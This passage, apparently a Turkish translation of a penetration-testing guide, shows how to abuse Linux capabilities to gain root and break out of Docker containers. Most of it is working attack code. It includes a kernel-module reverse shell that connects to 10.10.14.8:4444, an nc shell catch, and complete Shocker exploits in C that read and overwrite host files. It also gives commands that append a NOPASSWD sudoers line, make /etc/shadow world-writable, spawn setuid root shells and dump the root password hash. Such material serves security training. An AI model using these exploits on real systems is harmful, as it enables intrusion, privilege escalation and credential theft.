Komutun çıktısını göremezsiniz, ancak komut ilgili süreç tarafından yürütülür (bu nedenle bir rev shell alın).

> [!WARNING]
> "No symbol "system" in current context." hatasını alırsanız, gdb aracılığıyla bir programa shellcode yüklemeyi gösteren önceki örneğe bakın.

**Environment ile örnek (Docker breakout) - Shellcode Injection**

Docker container içinde etkinleştirilmiş capabilities değerlerini şu komutla kontrol edebilirsiniz:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Host'ta çalışan **processes**'leri listele `ps -eaf`

1. **architecture** bilgisini öğren `uname -m`
2. Bu **architecture** için bir **shellcode** bul ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. **shellcode**'u bir **process** belleğine **inject** edecek bir **program** bul ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. Program içindeki **shellcode**'u **değiştir** ve **derle** `gcc inject.c -o inject`
5. **Inject** et ve **shell**'ini al: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bir **process**'in **kernel modüllerini yüklemesine ve kaldırmasına (`init_module(2)`, `finit_module(2)` ve `delete_module(2)` sistem çağrıları)** olanak tanıyarak kernel'in temel işlemlerine doğrudan erişim sağlar. Bir modül yüklemek kernel davranışını değiştirebileceği ve izolasyon sınırlarını aşabileceği için bu capability ciddi güvenlik riskleri oluşturur.<sup>[[6]](#references)[[14]](#references)</sup>
Rootful, sıradan bir Linux container'da bu işlem **paylaşılan host kernel'ini** hedef alır ve bu nedenle doğrudan bir breakout oluşturur. Modül yükleme namespaced olmadığı için capability'nin başlangıç user namespace'inde etkin olması gerekir. gVisor, Kata veya Hyper-V gibi bir userspace-kernel ya da VM-izole runtime, erişilebilen kernel sınırını değiştirir. Modül yükleme yine de `modules_disabled`, kernel lockdown, imza zorunluluğu, seccomp veya bir LSM tarafından engellenebilir.<sup>[[14]](#references)</sup>

**Binary ile örnek**

Aşağıdaki örnekte **`python`** binary'si bu capability'ye sahiptir.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Varsayılan olarak **`modprobe`** komutu, **`/lib/modules/$(uname -r)`** dizininde bağımlılık listesi ve eşleme dosyalarını kontrol eder.\
Bunu kötüye kullanmak için sahte bir **lib/modules** klasörü oluşturalım:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Ardından **aşağıda 2 örneğini bulabileceğiniz kernel module'ü compile edip bu klasöre kopyalayın**:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Son olarak, bu kernel modülünü yüklemek için gerekli Python kodunu çalıştırın:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**İkili dosyayla Örnek 2**

Aşağıdaki örnekte **`kmod`** ikili dosyası bu capability'ye sahiptir.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Bu, kernel modülünü eklemek için **`insmod`** komutunu kullanmanın mümkün olduğu anlamına gelir. Bu ayrıcalığı kötüye kullanarak **reverse shell** elde etmek için aşağıdaki örneği izleyin.

**Ortam ile örnek (Docker breakout)**

Docker container içindeki etkin capabilities değerlerini şu komutla kontrol edebilirsiniz:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Önceki çıktıda **SYS_MODULE** capability’sinin etkin olduğunu görebilirsiniz.<sup>[[14]](#references)</sup>

Bir reverse shell çalıştıracak **kernel module**’ü ve bunu **derlemek** için **Makefile**’ı **oluşturun**:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Makefile içindeki her make sözcüğünden önce gelen boşluk karakteri **boşluk değil, sekme olmalıdır**!

Derlemek için `make` komutunu çalıştırın.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Son olarak, bir shell içinde `nc`'yi başlatın ve başka bir shell'den **modülü yükleyin**; böylece shell'i nc sürecinde yakalarsınız:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **adresindeki "Abusing SYS_MODULE Capability" laboratuvarından kopyalanmıştır.**<sup>[[1]](#references)</sup>

Bu tekniğin başka bir örneği [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) adresinde bulunabilir.

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html), bir sürecin **dosyaları okuma ve dizinleri okuma ve çalıştırma izinlerini atlamasını** sağlar. Ayrıca, aynı bağlı dosya sistemi için bir mount file descriptor'a göre geçerli bir file handle'ı yorumlayan `open_by_handle_at(2)` sistem çağrısına da izin verir. Bu özellik, süreç mount namespace'i dışındaki tüm dosyaları otomatik olarak erişilebilir kılmaz. File-handle breakout için ayrıca host açısından anlamlı bir dosya sistemi referansı, geçerli veya keşfedilebilir handle'lar, uyumlu bir dosya sistemi ve depolama düzeni gerekir; ayrıca runtime veya LSM tarafından engellenmemelidir. Geçmişteki Docker "Shocker" tekniği, etkilenen düzenlerde bu koşulların bir araya geldiğini göstermiştir; analizine [buradan](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) ulaşabilirsiniz.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Bu, dosya okuma izin denetimlerini ve dizin okuma/çalıştırma izin denetimlerini atlayabileceğiniz anlamına gelir**.<sup>[[14]](#references)</sup>

Bu özelliğe sahip **özel bir executable** için, ne okuduğunu ve çağırana ne döndürdüğünü inceleyin. Çağıranın belirlediği korumalı bir pathname'i ve önek uzunluğunu kabul eden, ardından bu öneğin tam digest'ini açıklayan bir dosya tarama yardımcısı, dosya okuma oracle'ı olarak kullanılabilir: İlk `n-1` baytı bulduktan sonra, olası her sonraki bayt için aday digest'leri, yardımcının `n` uzunluğu için verdiği digest ile karşılaştırın. Bu yöntem, kriptografik çakışma bulmaya veya özellikle MD5'e bağlı değildir; tekrarlanan, seçilen uzunluktaki sorgulara ve görünür, deterministik digest'lere dayanır. Önek denetimi olmadan alınan bir dosyanın tamamına ait digest aynı yöntemin kullanılabileceğini göstermez. Çağıranın yardımcıyı çalıştırabildiğini, dosya capability'sinin effective hâle geldiğini, seçilen path'e kendi mount namespace'i içinden erişilebildiğini ve belirtilen girdi/çıktı davranışının gerçekten mevcut olduğunu doğrulayın. Pasif enumeration sırasında test etmek için bilinmeyen, ayrıcalıklı bir yardımcıyı çalıştırmayın.

**Binary ile örnek**

Binary, kendi namespace'leri içinde erişilebilen dosyaları okuyabilir. Dolayısıyla, `tar` gibi bir dosya bu capability'ye sahipse shadow dosyasını okuyabilir:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**binary2 ile örnek**

Bu durumda **`python`** binary'sinin bu capability'ye sahip olduğunu varsayalım. root dosyalarını listelemek için şunu yapabilirsiniz:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

Bir dosyayı okumak için şunu yapabilirsiniz:

```python
print(open("/etc/shadow", "r").read())
```

**Ortamda Örnek (Docker breakout)**

Docker container içinde etkin capabilities değerlerini `capsh --print` kullanarak kontrol edebilirsiniz.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Önceki çıktıda **DAC_READ_SEARCH** capability’sinin etkin olduğunu görebilirsiniz. Bu capability, DAC okuma/arama denetimlerini atlar ve `open_by_handle_at(2)` kullanımına izin verir; tek başına süreç hata ayıklama capability’si değildir.<sup>[[14]](#references)</sup>

[https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) adresinde aşağıdaki exploit’in nasıl çalıştığını öğrenebilirsiniz. Kısaca, **CAP_DAC_READ_SEARCH** dosya sisteminde izin denetimleri olmadan gezinmeye olanak tanır ve `open_by_handle_at(2)` kullanımına izin verir; ilgili namespace’lere ve mount’lara erişilebiliyorsa diğer süreçlerin açtığı dosyaları açığa çıkarabilir.<sup>[[13]](#references)[[14]](#references)</sup>

Bu izinleri kötüye kullanarak host’taki dosyaları okuyan özgün exploit’e buradan ulaşabilirsiniz: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); aşağıda, okunacak dosyayı ilk argüman olarak vermenize ve sonucu bir dosyaya dökmenize olanak tanıyan **değiştirilmiş bir sürüm** yer alıyor.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> Exploit’in host üzerinde mount edilmiş bir şeye işaretçi bulması gerekir. Orijinal exploit `/.dockerinit` dosyasını kullanıyordu; bu değiştirilmiş sürüm ise `/etc/hostname` dosyasını kullanıyor. Exploit çalışmıyorsa farklı bir dosya belirlemeniz gerekebilir. Host üzerinde mount edilmiş bir dosya bulmak için `mount` komutunu çalıştırın:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit’in host üzerinde mount edilmiş bir şeye işaretçi bulması gerekir. Orijinal exploit `/.dockerinit` dosyasını kullanıyordu; bu değiştirilmiş sürüm ise...](<../../images/image (407) (1).png>)

**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **sitesindeki "Abusing DAC_READ_SEARCH Capability" laboratuvarından kopyalanmıştır.**<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Bu capability, dosya okuma ve yazma izin denetimlerini ve çoğu çalıştırma denetimini atlar**; normal bir dosyayı çalıştırmak için yine de en az bir çalıştırma bitinin ayarlanmış olması gerekir. Salt okunur bir mount’u, değiştirilemez durumu veya LSM tarafından reddedilme durumunu geçersiz kılmaz.<sup>[[14]](#references)</sup>

Ayrıcalıklı bir gruba üye olunduğunda okunabilir veya yazılabilir hâle gelen dosyaları arayın; işe yarar hedefler hedefin sahipliğine ve mod bitlerine bağlıdır.<sup>[[14]](#references)</sup>

**Binary ile örnek**

Bu örnekte vim bu capability’ye sahip olduğundan _passwd_, _sudoers_ veya _shadow_ gibi herhangi bir dosyayı değiştirebilirsiniz:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**İkili dosya 2 ile örnek**

Bu örnekte **`python`** ikili dosyası bu capability'ye sahip olacak. Herhangi bir dosyanın üzerine yazmak için Python'ı kullanabilirsiniz:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Environment + CAP_DAC_READ_SEARCH ile örnek (Docker breakout)**

`CAP_DAC_READ_SEARCH`, `open_by_handle_at(2)` kullanımına izin verir ancak yazma izin denetimlerini **atlatmaz**. Çözümlenmiş bir handle üzerinden yazmak için ayrıca sürecin etkin filesystem UID/GID’si veya ACL’si üzerinden yazma erişimi ya da `CAP_DAC_OVERRIDE` gerekir. İşlemin gerçekleşebilmesi için host ile ilgili filesystem referansı, desteklenen file handle’lar, yazılabilir bir mount ve runtime/LSM policy de izin vermelidir. Etkin capabilities ve kimliği kontrol edin; bu capability’lerden hiçbiri tek başına host üzerinde yazılabilir bir hedef olduğunu kanıtlamaz. [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) ve [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html) sayfalarına bakın.<sup>[[14]](#references)[[26]](#references)</sup>

Öncelikle, host üzerindeki rastgele dosyaları okumak için [**DAC_READ_SEARCH capability’sini kötüye kullanan**](linux-capabilities.md#cap_dac_read_search) önceki bölümü okuyun ve exploit’i **derleyin**.\
Aşağıdaki tarihî örnek, çözümlenmiş bir dosyayı `O_RDWR` ile açmayı dener; yalnızca yukarıda belirtilen filesystem ve yazma izni koşulları sağlandığında başarılı olur:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Docker container'dan **kaçmak** için host'taki `/etc/shadow` ve `/etc/passwd` dosyalarını **indirebilir**, bunlara **yeni bir kullanıcı ekleyebilir** ve dosyaların üzerine yazmak için **`shocker_write`** kullanabilirsiniz. Ardından **ssh** üzerinden **erişim sağlayabilirsiniz**.

**Bu tekniğin kodu,** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **sitesindeki "Abusing DAC_OVERRIDE Capability" laboratuvarından kopyalanmıştır.**<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Bu capability, bir sürecin dosyaların sahipliğini değiştirmesine olanak tanır.**<sup>[[14]](#references)</sup>

**Binary örneği**

**`python`** binary'sinin bu capability'ye sahip olduğunu varsayalım; **`shadow`** gibi bir dosyanın sahibini değiştirebilir, ardından diğer izinler elveriyorsa elde ettiğiniz erişimi dosyayı değiştirmek için kullanabilirsiniz:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Ya da bu capability'ye sahip **`ruby`** binary'siyle:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Bu capability, izinleri değiştirme de dahil olmak üzere birçok dosya işlemi için sahiplik denetimlerini atlar**.<sup>[[14]](#references)</sup>

**Binary ile örnek**

Python bu capability'ye sahipse shadow dosyasının izinlerini değiştirebilir, **root parolasını değiştirebilir** ve ayrıcalıklarınızı yükseltebilirsiniz:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**Bu capability, kernel tarafından uygulanan kimlik bilgisi ve capability kurallarına tabi olarak bir sürecin etkin kullanıcı kimliğini değiştirmesine olanak tanır**.<sup>[[14]](#references)</sup>

**İkili dosyayla örnek**

Python bu **capability** değerine sahipse, root yetkilerine yükselmek için bunu kolayca kötüye kullanabilirsiniz:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Başka bir yöntem:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

`CAP_SETUID` etkinliğine sahip **özel** bir executable için, yalnızca capability'nin shell sağladığını varsaymak yerine erişilebilir kod yolunu inceleyin. [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) fonksiyonuna *format string* olarak aktarılan, çağıranın kontrolündeki metin süreç belleğini açığa çıkarabilir veya değiştirebilir; ancak işe yarar bir yetki geçişi için savunmasız bir çağrı, kontrol edilebilir girdi ve `setuid(0)` sonrasında gerçekleşen bir eylem gerekir. Bu eylem harici bir helper'ı adıyla başlatıyorsa, başlatma anındaki etkin kimliği, gerçek `PATH` değerini ve aramada daha önce gelen bir dizinin çağıran tarafından yazılabilir ve içinde gezinilebilir olup olmadığını doğrulayın. Etkisiz bir file capability, `no_new_privs`, sabit ve güvenilir bir helper yolu veya erişilemeyen bir dal sonucu değiştirir. Binary'yi veya mevcut kaynak kodunu offline inceleyin; rutin envanter sırasında şüpheli ve ayrıcalıklı bir helper'ı çalıştırmayın.

## CAP_SETGID

**Bu capability, kernel tarafından uygulanan kimlik bilgisi ve capability kurallarına tabi olarak bir sürecin etkin grup kimliğini değiştirmesine olanak tanır**.<sup>[[14]](#references)</sup>

**Ayrıcalıkları yükseltmek için üzerine yazabileceğiniz** çok sayıda dosya vardır; [**buradan fikir edinebilirsiniz**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Binary ile örnek**

Bu durumda, herhangi bir grubu taklit edebileceğiniz için bir grubun okuyabildiği ilginç dosyaları aramalısınız:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Ayrıcalıkları yükseltmek için kötüye kullanabileceğiniz (okuma veya yazma yoluyla) bir dosya bulduğunuzda, şu şekilde **ilginç grubu taklit eden bir shell alabilirsiniz**:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

Bu durumda, shadow grubu taklit edildiği için `/etc/shadow` dosyasını okuyabilirsiniz:

```bash
cat /etc/shadow
```

### Birleşik zincir: CAP_SETGID + CAP_CHOWN

Her iki capability de aynı helper'da mevcut olduğunda, uygulanabilir bir zincir şöyledir:

1. EGID'yi `shadow` (veya başka bir ayrıcalıklı grup) olarak değiştirin.
2. Grup `shadow` olarak kalacak şekilde `/etc/shadow` üzerinde `chown` kullanarak UID'nizi ayarlayın.
3. Hedef hash'i okuyup crack/pivot yapın.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Bu, doğrudan tam root erişimi gereksinimini ortadan kaldırır ve credential reuse yoluyla pivot etmek için genellikle yeterlidir.

**docker** yüklüyse **docker group** kimliğine bürünebilir ve [**docker socket** ile iletişim kurarak yetkileri yükseltebilirsiniz](#writable-docker-socket).

## CAP_SETFCAP

**Bu capability, bir sürecin dosya capability’lerini ayarlamasına olanak tanır**.<sup>[[14]](#references)</sup>

**Binary ile örnek**

Python bu **capability**’ye sahipse, bunu kötüye kullanarak root yetkilerine yükselmek çok kolaydır:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Yeni yazılan bir dosya capability set'i önceki set'in yerini alır; helper yalnızca yeni capability'lerle çalıştırılırsa başka bir dosyayı güncellemek için artık `CAP_SETFCAP`'i korumayabilir.<sup>[[14]](#references)[[25]](#references)</sup>

[SETUID capability](linux-capabilities.md#cap_setuid) elde ettikten sonra ayrıcalıkları nasıl yükselteceğinizi görmek için ilgili bölüme gidebilirsiniz.

**Environment ile örnek (Docker breakout)**

Docker'ın belgelenmiş varsayılan capability set'i **CAP_SETFCAP** içerir, ancak gerçek set runtime yapılandırmasına bağlıdır.<sup>[[19]](#references)</sup>
Process capability'lerini şu komutla inceleyebilirsiniz:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
